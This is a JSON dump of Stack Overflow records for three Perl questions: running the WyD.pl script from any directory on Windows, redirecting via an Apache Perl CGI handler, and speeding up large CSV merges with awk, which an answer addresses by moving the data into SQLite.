"https://i.stack.imgur.com/cZDaT.jpg?s=128&g=1", "display_name": "Hashim Aziz", "link": "https://stackoverflow.com/users/1191147/hashim-aziz"}, "delete_vote_count": 0, "reopen_vote_count": 0, "close_vote_count": 0, "is_answered": false, "view_count": 244, "favorite_count": 0, "answer_count": 0, "score": 1, "last_activity_date": 1485555860, "creation_date": 1485394831, "last_edit_date": 1485555860, "question_id": 41864672, "link": "https://stackoverflow.com/questions/41864672/how-do-i-run-a-perl-program-from-anywhere-on-my-computer", "title": "How do I run a Perl program from anywhere on my computer?", "body": "<p>I'm trying to run a Perl program - <a href=\"http://www.darknet.org.uk/2006/11/wyd-automated-password-profiling-tool/\" rel=\"nofollow noreferrer\">WyD.pl</a> - on Windows 7. I have Strawberry Perl installed, and the WyD installation folder is located at <code>C:\\wyd.pl-0.2</code>.  </p>\n\n<p>Currently, running the program requires navigating  to the <em>WyD</em> install  directory in the command line, using <code>cd \"C:\\wyd.pl-0.2\"</code>, and then running it with <code>wyd.pl</code>.</p>\n\n<p><strong>How do I make it so that I can circumvent the first step entirely, and call the program with <code>wyd.pl</code> from any directory on the computer?</strong></p>\n"}, {"tags": ["apache", "perl", "redirect", "cgi", "cgi-bin"], "comments": [{"owner": {"reputation": 320771, "user_id": 589924, "user_type": "registered", "accept_rate": 100, "profile_image": "https://www.gravatar.com/avatar/b2cf53d5a3d25f95c0db4e025aed4153?s=128&d=identicon&r=PG", "display_name": "ikegami", "link": "https://stackoverflow.com/users/589924/ikegami"}, "edited": false, "score": 1, "creation_date": 1485390872, "post_id": 41864064, "comment_id": 70911930, "body": "The header is missing the status code. You&#39;re also outputting headers in a loop, which makes no sense."}, {"owner": {"reputation": 185733, "user_id": 152948, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/194ef8f807c34a9d7aab0e11a8674768?s=128&d=identicon&r=PG", "display_name": "hobbs", "link": "https://stackoverflow.com/users/152948/hobbs"}, "edited": false, "score": 1, "creation_date": 1485391025, "post_id": 41864064, "comment_id": 70911976, "body": "How many places do you think you can redirect a client to in a single response? :)"}, {"owner": {"reputation": 501, "user_id": 4910011, "user_type": "registered", "accept_rate": 100, "profile_image": "https://i.stack.imgur.com/E5U60.png?s=128&g=1", "display_name": "Leo Wilson", "link": "https://stackoverflow.com/users/4910011/leo-wilson"}, "edited": false, "score": 0, "creation_date": 1485391566, "post_id": 41864064, "comment_id": 70912106, "body": "This was just copying and pasting various pieces of code from the internet, so it&#39;s a bit impractical :)"}], "answers": [{"comments": [{"owner": {"reputation": 2092, "user_id": 2678168, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/dd5a048ca5e77e9683d0197b5455b3a9?s=128&d=identicon&r=PG&f=1", "display_name": "Georg Mavridis", "link": "https://stackoverflow.com/users/2678168/georg-mavridis"}, "reply_to_user": {"reputation": 501, "user_id": 4910011, "user_type": "registered", "accept_rate": 100, "profile_image": "https://i.stack.imgur.com/E5U60.png?s=128&g=1", "display_name": "Leo Wilson", "link": "https://stackoverflow.com/users/4910011/leo-wilson"}, "edited": false, "score": 0, "creation_date": 1485519414, "post_id": 41868677, "comment_id": 70969345, "body": "Did you add the she-bang line at the beginning, and the function definition ? Did you set the executable bit?"}, {"owner": {"reputation": 501, "user_id": 4910011, "user_type": "registered", "accept_rate": 100, "profile_image": "https://i.stack.imgur.com/E5U60.png?s=128&g=1", "display_name": "Leo Wilson", "link": "https://stackoverflow.com/users/4910011/leo-wilson"}, "edited": false, "score": 0, "creation_date": 1485560574, "post_id": 41868677, "comment_id": 70991951, "body": "Never mind, works perfectly.  I had a bad <code>use</code> statement, pointing to a nonexistent class.  Removed it, all is fixed."}], "tags": [], "owner": {"reputation": 2092, "user_id": 2678168, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/dd5a048ca5e77e9683d0197b5455b3a9?s=128&d=identicon&r=PG&f=1", "display_name": "Georg Mavridis", "link": "https://stackoverflow.com/users/2678168/georg-mavridis"}, "is_accepted": true, "score": 1, "last_activity_date": 1485415993, "creation_date": 1485415993, "answer_id": 41868677, "question_id": 41864064, "link": "https://stackoverflow.com/questions/41864064/how-does-one-redirect-using-an-apache-perl-handler/41868677#41868677", "title": "How does one redirect using an Apache Perl Handler?", "body": "<p>Back in the cgi-days we used to have a small subroutine that does the redirecting:</p>\n\n<pre><code>sub redirect_url {\n    my ($url, %params) = @_;\n\n    $params{Location} = $url;\n\n    if ( ($ENV{'HTTP_USER_AGENT'}=~m|Mozilla\\/4\\.|)\n        &amp;&amp; !($ENV{'HTTP_USER_AGENT'}=~m|MSIE|) ) {\n\n        # handle redirects on netscape 4.x\n        $params{Status} = '303 See Other'\n            unless exists $params{Status};\n        $params{'Content-Type'} = 'text/html; charset=utf-8'\n            unless exists $params{'Content-Type'};\n        $params{Content} =&lt;&lt;EOF;\n&lt;html&gt;\n  &lt;head&gt;\n    &lt;script language=\"JavaScript\"&gt;&lt;!--\nlocation.href = \"$params{Location}\";\n//--&gt;&lt;/script&gt;\n  &lt;/head&gt;\n  &lt;body bgcolor=\"#FFFFFF\"&gt;\n    &lt;a href=\"$params{Location}\"&gt;Redirect&lt;/a&gt;\n  &lt;/body&gt;\nEOF\n    }\n    else {\n            $params{Status} = '301 Moved Permanently'\n            unless exists $params{Status};\n        $params{'Content-Type'} = 'text/plain; charset=utf-8'\n            unless exists $params{'Content-Type'};\n    }\n\n    $params{Expires} = 'Fri, 19 May 1996 00:00:00 GMT'\n        unless exists $params{Expires};\n    $params{Pragma} = 'no-cache'\n        unless exists $params{Pragma};\n    $params{'Cache-Control'} = 'no-cache'\n        unless exists $params{'Cache-Control'};\n\n    my $content = exists $params{Content}\n        ? $params{Content} : $params{Status};\n    delete $params{Content};\n\n    while (my ($key, $value) = each %params) {\n        print \"$key: $value\\n\";\n    }\n    print \"\\n\";\n    print $content;\n\n    exit 0;\n}\n</code></pre>\n\n<p>so if I get the rest of your code rite:</p>\n\n<pre><code>use strict;\nmy $file = $ENV{'PATH_TRANSLATED'};\nopen (my $fh, '&lt;', $file) or die 'cant open';\nmy $url = &lt;$fh&gt;;\nchomp($url);\nredirect_url($url);\n</code></pre>\n\n<p>would do the job.</p>\n"}], "owner": {"reputation": 501, "user_id": 4910011, "user_type": "registered", "accept_rate": 100, "profile_image": "https://i.stack.imgur.com/E5U60.png?s=128&g=1", "display_name": "Leo Wilson", "link": "https://stackoverflow.com/users/4910011/leo-wilson"}, "delete_vote_count": 0, "reopen_vote_count": 0, "close_vote_count": 0, "is_answered": true, "view_count": 533, "favorite_count": 0, "accepted_answer_id": 41868677, "answer_count": 1, "score": 1, "last_activity_date": 1485415993, "creation_date": 1485389849, "last_edit_date": 1485390806, "question_id": 41864064, "link": "https://stackoverflow.com/questions/41864064/how-does-one-redirect-using-an-apache-perl-handler", "title": "How does one redirect using an Apache Perl Handler?", "body": "<p>I have an Apache Handler that sets an extension, <code>.redir</code>, to a Perl script.  The code is as follows:</p>\n\n<pre><code>Action redir-url /cgi-bin/redir.pl\nAddHandler redir-url .redir\n</code></pre>\n\n<p>The script should simply redirect the user to the page contained in the <code>.redir</code> file.  Example:</p>\n\n<p><code>so.redir</code>:</p>\n\n<pre><code>http://stackoverflow.com/\n</code></pre>\n\n<p>If the user visits <code>http://example.com/so.redir</code>, they will be redirected to <code>http://stackoverflow.com/</code>.</p>\n\n<p>My current code is as follows, though it returns an error 500, and probably is completely off:</p>\n\n<pre><code>#!/usr/bin/perl\nuse strict;\nuse warnings;\n\nuse Path::Class;\nuse autodie;\n\nmy $file = file($ENV{'PATH_TRANSLATED'});\n\nmy $file_handle = $file-&gt;openw();\n\nmy @list = ('a', 'list', 'of', 'lines');\n\nforeach my $line ( @list ) {\n    # Add the line to the file\n    $file_handle-&gt;print(\"Location: \".$line.\"\\n\\n\");\n}\n</code></pre>\n\n<p>Thank you for any help!</p>\n"}, {"tags": ["python", "performance", "perl", "awk"], "comments": [{"owner": {"reputation": 44584, "user_id": 2617068, "user_type": "registered", "accept_rate": 50, "profile_image": "https://i.stack.imgur.com/0nSBO.png?s=128&g=1", "display_name": "TigerhawkT3", "link": "https://stackoverflow.com/users/2617068/tigerhawkt3"}, "edited": false, "score": 0, "creation_date": 1485389764, "post_id": 41864011, "comment_id": 70911623, "body": "Seems like something for Pandas or Numpy."}, {"owner": {"reputation": 53041, "user_id": 4653379, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/b3953dbedd0dabff5cbc3db9b0835b14?s=128&d=identicon&r=PG&f=1", "display_name": "zdim", "link": "https://stackoverflow.com/users/4653379/zdim"}, "edited": false, "score": 0, "creation_date": 1485390029, "post_id": 41864011, "comment_id": 70911702, "body": "Of course it&#39;s better to have a script, for every purpose.  Why don&#39;t you write one and time it? I&#39;d expect it to be two orders of magnitude faster in a straight-up Perl script."}, {"owner": {"reputation": 155597, "user_id": 1745001, "user_type": "registered", "accept_rate": 100, "profile_image": "https://www.gravatar.com/avatar/99a3ebae89496eb16afe453aae97f5be?s=128&d=identicon&r=PG", "display_name": "Ed Morton", "link": "https://stackoverflow.com/users/1745001/ed-morton"}, "reply_to_user": {"reputation": 53041, "user_id": 4653379, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/b3953dbedd0dabff5cbc3db9b0835b14?s=128&d=identicon&r=PG&f=1", "display_name": "zdim", "link": "https://stackoverflow.com/users/4653379/zdim"}, "edited": false, "score": 0, "creation_date": 1485390925, "post_id": 41864011, "comment_id": 70911952, "body": "@zdim Why would you think it&#39;d be faster in perl than awk? gkandoi what&#39;s the point of doing <code>$4=a[$1,$2];print</code> and forcing awk to recompile $0 instead of simply <code>print $0, a[$1,$2]</code>?"}, {"owner": {"reputation": 53041, "user_id": 4653379, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/b3953dbedd0dabff5cbc3db9b0835b14?s=128&d=identicon&r=PG&f=1", "display_name": "zdim", "link": "https://stackoverflow.com/users/4653379/zdim"}, "reply_to_user": {"reputation": 155597, "user_id": 1745001, "user_type": "registered", "accept_rate": 100, "profile_image": "https://www.gravatar.com/avatar/99a3ebae89496eb16afe453aae97f5be?s=128&d=identicon&r=PG", "display_name": "Ed Morton", "link": "https://stackoverflow.com/users/1745001/ed-morton"}, "edited": false, "score": 0, "creation_date": 1485391081, "post_id": 41864011, "comment_id": 70911994, "body": "@EdMorton  No particular reason for perl vs awk -- I just don&#39;t see why simple processing on that amount of data would go for an hour and a half.  Perhaps I&#39;m misjudging something.  I&#39;d scale the estimate down to one order of magnitude faster."}, {"owner": {"reputation": 155597, "user_id": 1745001, "user_type": "registered", "accept_rate": 100, "profile_image": "https://www.gravatar.com/avatar/99a3ebae89496eb16afe453aae97f5be?s=128&d=identicon&r=PG", "display_name": "Ed Morton", "link": "https://stackoverflow.com/users/1745001/ed-morton"}, "reply_to_user": {"reputation": 53041, "user_id": 4653379, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/b3953dbedd0dabff5cbc3db9b0835b14?s=128&d=identicon&r=PG&f=1", "display_name": "zdim", "link": "https://stackoverflow.com/users/4653379/zdim"}, "edited": false, "score": 0, "creation_date": 1485391176, "post_id": 41864011, "comment_id": 70912017, "body": "@zdim I agree that seems like a ridiculuous duration. I can&#39;t imagine why it&#39;d take that long but I suspect the OP is doing this in a shell loop and THAT is where the problem is coming from, nothing to do with the awk script he&#39;s calling repeatedly in that loop. gkandoi if you post some concise, testable sample input (you say you have more than 2 files so don&#39;t just post 2 files, post at least 3) and expected output then we can start trying to help you."}, {"owner": {"reputation": 19969, "user_id": 23512, "user_type": "registered", "accept_rate": 56, "profile_image": "https://i.stack.imgur.com/tUj1I.png?s=128&g=1", "display_name": "Tanktalus", "link": "https://stackoverflow.com/users/23512/tanktalus"}, "edited": false, "score": 1, "creation_date": 1485391545, "post_id": 41864011, "comment_id": 70912100, "body": "I would throw it at a db.  SQL or NoSQL, doesn&#39;t matter."}, {"owner": {"reputation": 53041, "user_id": 4653379, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/b3953dbedd0dabff5cbc3db9b0835b14?s=128&d=identicon&r=PG&f=1", "display_name": "zdim", "link": "https://stackoverflow.com/users/4653379/zdim"}, "reply_to_user": {"reputation": 155597, "user_id": 1745001, "user_type": "registered", "accept_rate": 100, "profile_image": "https://www.gravatar.com/avatar/99a3ebae89496eb16afe453aae97f5be?s=128&d=identicon&r=PG", "display_name": "Ed Morton", "link": "https://stackoverflow.com/users/1745001/ed-morton"}, "edited": false, "score": 0, "creation_date": 1485391635, "post_id": 41864011, "comment_id": 70912124, "body": "@EdMorton  If it involves shell that can easily explain it.  I just wrote a 100-million-line file with a similar structure (2 mins, involving <code>rand</code>) and then processed it with a one-liner (Perl) of a comparable complexity -- just under 3 mins."}, {"owner": {"reputation": 24179, "user_id": 1672429, "user_type": "registered", "accept_rate": 77, "profile_image": "https://www.gravatar.com/avatar/0815eb7d4e9dd58022d51ba2011b9c0a?s=128&d=identicon&r=PG", "display_name": "Stefan Pochmann", "link": "https://stackoverflow.com/users/1672429/stefan-pochmann"}, "edited": false, "score": 0, "creation_date": 1485391958, "post_id": 41864011, "comment_id": 70912183, "body": "How fast is your disk? And what&#39;s the sum of the output file sizes?"}, {"owner": {"reputation": 117, "user_id": 4020084, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/2624594f5e159d41693b336e70da81ca?s=128&d=identicon&r=PG&f=1", "display_name": "gkandoi", "link": "https://stackoverflow.com/users/4020084/gkandoi"}, "reply_to_user": {"reputation": 155597, "user_id": 1745001, "user_type": "registered", "accept_rate": 100, "profile_image": "https://www.gravatar.com/avatar/99a3ebae89496eb16afe453aae97f5be?s=128&d=identicon&r=PG", "display_name": "Ed Morton", "link": "https://stackoverflow.com/users/1745001/ed-morton"}, "edited": false, "score": 0, "creation_date": 1485392377, "post_id": 41864011, "comment_id": 70912291, "body": "@EdMorton I&#39;ve added File 3 and the final output after using the awk one-liner. I picked up the script from a blog and used it as it was without thinking about the speed. It was only after I ran it through few files I thought it was taking very long."}, {"owner": {"reputation": 117, "user_id": 4020084, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/2624594f5e159d41693b336e70da81ca?s=128&d=identicon&r=PG&f=1", "display_name": "gkandoi", "link": "https://stackoverflow.com/users/4020084/gkandoi"}, "reply_to_user": {"reputation": 24179, "user_id": 1672429, "user_type": "registered", "accept_rate": 77, "profile_image": "https://www.gravatar.com/avatar/0815eb7d4e9dd58022d51ba2011b9c0a?s=128&d=identicon&r=PG", "display_name": "Stefan Pochmann", "link": "https://stackoverflow.com/users/1672429/stefan-pochmann"}, "edited": false, "score": 0, "creation_date": 1485392558, "post_id": 41864011, "comment_id": 70912336, "body": "@StefanPochmann I don&#39;t think it is the best of the clusters out there, but here is the detailed information on the cluster: <a href=\"http://hpcgroup.public.iastate.edu/HPC/lightning3/description.html\" rel=\"nofollow noreferrer\">hpcgroup.public.iastate.edu/HPC/lightning3/description.html</a>"}], "answers": [{"comments": [{"owner": {"reputation": 53041, "user_id": 4653379, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/b3953dbedd0dabff5cbc3db9b0835b14?s=128&d=identicon&r=PG&f=1", "display_name": "zdim", "link": "https://stackoverflow.com/users/4653379/zdim"}, "edited": false, "score": 1, "creation_date": 1485554637, "post_id": 41865056, "comment_id": 70989997, "body": "Thank you, it is helpful to be aware/reminded of this option. I am thinking, it&#39;s not just about a lot of data -- it&#39;s also good for its relational capabilities, that it makes available."}], "tags": [], "owner": {"reputation": 126333, "user_id": 14660, "user_type": "registered", "accept_rate": 62, "profile_image": "https://www.gravatar.com/avatar/e55e0ec3c00f834d78fbdddeaa36e308?s=128&d=identicon&r=PG", "display_name": "Schwern", "link": "https://stackoverflow.com/users/14660/schwern"}, "is_accepted": true, "score": 5, "last_activity_date": 1485659010, "last_edit_date": 1495535367, "creation_date": 1485397865, "answer_id": 41865056, "question_id": 41864011, "link": "https://stackoverflow.com/questions/41864011/associative-arrays-python-vs-perl-vs-awk-performace/41865056#41865056", "title": "Associative Arrays: Python vs Perl vs Awk Performace", "body": "<p>When you have huge data files and you want to work with them efficiently, you're probably best off throwing them into a SQLite database, indexing them, and then querying them. See <a href=\"https://stackoverflow.com/a/40696615/14660\">my answer about CSV vs SQLite performance</a> for more on that.</p>\n\n<p>Create a table for the data (stuff is a terrible name, but I don't know what this data is, so it's \"stuff\").</p>\n\n<pre><code>create table stuff (\n    key1 text,\n    key2 text,\n    value real\n);\n</code></pre>\n\n<p>Import your CSVs into the table using the SQLite shell.</p>\n\n<pre><code>sqlite&gt; .mode csv\nsqlite&gt; .import file1 stuff\nsqlite&gt; .import file2 stuff\nsqlite&gt; .import file3 stuff\n</code></pre>\n\n<p>Create an index for the keys.</p>\n\n<pre><code>create index stuff_key on stuff (key1, key2);\n</code></pre>\n\n<p>Query to your heart's content.</p>\n\n<pre><code>select value\nfrom stuff\nwhere key1 = \"NM_001011874.1\" and\n      key2 = \"XR_104537.1\"\n\n-0.929524370261122\n-0.11254525414\n-0.41254525414\n</code></pre>\n\n<p>Once the import and indexing is done, it won't matter how large the data gets. Instead of updating the CSVs and reimporting all of them, you can import small CSV files with just the new fields. Or you can skip the CSVs and insert them directly.</p>\n\n<pre><code>insert into stuff (key1, key2, value)\nvalues (\"NM_204958293.2\", \"XR_29238498.3\", -239.2),\n       (\"NM_2904892.3\", \"XR_3093.0\", 9482.39);\n</code></pre>\n\n<hr>\n\n<p>I tested the performance of this, because I've advocated it a bunch of times, but haven't tested it.</p>\n\n<p>First I cleared a bunch of disk space, because these files are going to get big. I'm doing this on a Macbook Pro i7 that was state of the art in 2011. Fortunately it has an after market SSD so I/O performance is excellent. It's no slouch, but it's not a top of the line server either. Point is, you don't need fancy hardware to get good performance.</p>\n\n<p>Then I wrote a <a href=\"https://gist.github.com/schwern/14a11411f08d960981c5a7dde3fa4061\" rel=\"nofollow noreferrer\">Perl program to generate 400 million rows of data</a>, then while that was running I wrote <a href=\"https://gist.github.com/schwern/817105c33a27d225fa453f5017974c8f\" rel=\"nofollow noreferrer\">a C program to do it faster</a>. In a rare instance of <em>program time</em> being more important than <em>programmer time</em> for a one-off script, the C program finished first winding up with two roughly identical 14G files. They're a bit different, but it won't matter for our purposes.</p>\n\n<p>Then I created the table and started the import. The initial import time isn't terribly important because I don't have to sit here and stare at it or baby it. I know it's going to work, I know I only have to do it once, so I can work on any number of things in parallel (like editing this post). Unfortunately, SQLite isn't working in parallel, it seems to be using only one core. OTOH it isn't using more than about 3 megs of memory.</p>\n\n<p>Importing one 400 million row file took 20 minutes. The resulting SQLite database is about 17 gigs, so no great expansion of the data. I'm not going to do the rest because it rapidly becomes redundant.</p>\n\n<p>Now I'm creating the index. Again, it's a one time thing that I don't have to sit around and watch... except I do because it's using a 1 gig of virtual memory, and the SQLite file is now 30 gigs. So... more deleting of files. Building the index took about 30 minutes.</p>\n\n<p>50 minutes to import and index using 30 gigs of disk, about two times more than the original data. No programming necessary.</p>\n"}], "owner": {"reputation": 117, "user_id": 4020084, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/2624594f5e159d41693b336e70da81ca?s=128&d=identicon&r=PG&f=1", "display_name": "gkandoi", "link": "https://stackoverflow.com/users/4020084/gkandoi"}, "delete_vote_count": 0, "reopen_vote_count": 0, "close_vote_count": 0, "is_answered": true, "view_count": 1755, "favorite_count": 1, "accepted_answer_id": 41865056, "answer_count": 1, "score": -3, "last_activity_date": 1485659010, "creation_date": 1485389540, "last_edit_date": 1485397809, "question_id": 41864011, "link": "https://stackoverflow.com/questions/41864011/associative-arrays-python-vs-perl-vs-awk-performace", "title": "Associative Arrays: Python vs Perl vs Awk Performace", "body": "<p>I'm working with files that have ~400 million rows and 3 columns. The first two columns are alpha-numeric strings while the last is numeric. Something like this:</p>\n\n<pre><code>NM_001011874.1,NM_011441.4,-0.131672299779153\n</code></pre>\n\n<p>I've multiple such files with approximately the same number of rows and 3 columns. These aren't necessarily sorted based on any of the 3 columns. I'm trying to combine these files based on the combination of the first two columns. For instance:</p>\n\n<pre><code>File 1\n\nNM_001011874.1,XR_104537.1,-0.929524370261122\nNM_001011874.1,XM_003084433.1,-0.603098764428879\n\nFile 2\n\nNM_001011874.1,XR_104537.1,-0.11254525414\nNM_001011874.1,NM_005040.1,-0.20509876488\n\nFile 3\n\nNM_001011874.1,XR_104537.1,-0.41254525414\nNM_001011874.1,NM_005040.1,-0.60509876488\n</code></pre>\n\n<p>What I'm trying to do is create a key by using the combination of values in the first two columns and then retrieving the corresponding value from the third column for that pair. The final output I get is:</p>\n\n<pre><code>Output2 \n\nNM_001011874.1,XR_104537.1,-0.11254525414,-0.929524370261122,-0.41254525414\nNM_001011874.1,NM_005040.1,-0.20509876488,,-0.60509876488\n</code></pre>\n\n<p>I'm using awk to do the above:</p>\n\n<pre><code>awk -F',' 'NR==FNR{a[$1,$2]=$3;next}{$4=a[$1,$2];print}' OFS=',' file1.txt file2.txt\n</code></pre>\n\n<p>I'm allocating 256GB for the task. It takes about 90mins using the above command for producing the output by combining through two files where each file has ~400 million rows and 3 columns. The output file again has ~400 millions rows but 4 columns. Time taken to produce the output file increases with every added column.</p>\n\n<p>I'm doing it sequentially, i.e. merge file1 and file2 to produce output1 with 4 columns. Then merge file3 and output1 to produce output2 with 5 columns, then file4 and output2 to produce output3 with 6 columns and so on until I've the final output with 22 columns.</p>\n\n<p>I wonder if it would be more efficient in terms of speed and automation to do this in Python or Perl? I've about 20 such files with 3 columns each, although the rows vary from ~100 million to ~400 million. If you think I would be better off doing this in Python or Perl, can you please share an example to illustrate how the awk script translates to Python or Perl.</p>\n\n<p>Edit:\nAdded File 3 and the final output after that based on the comments.</p>\n"}]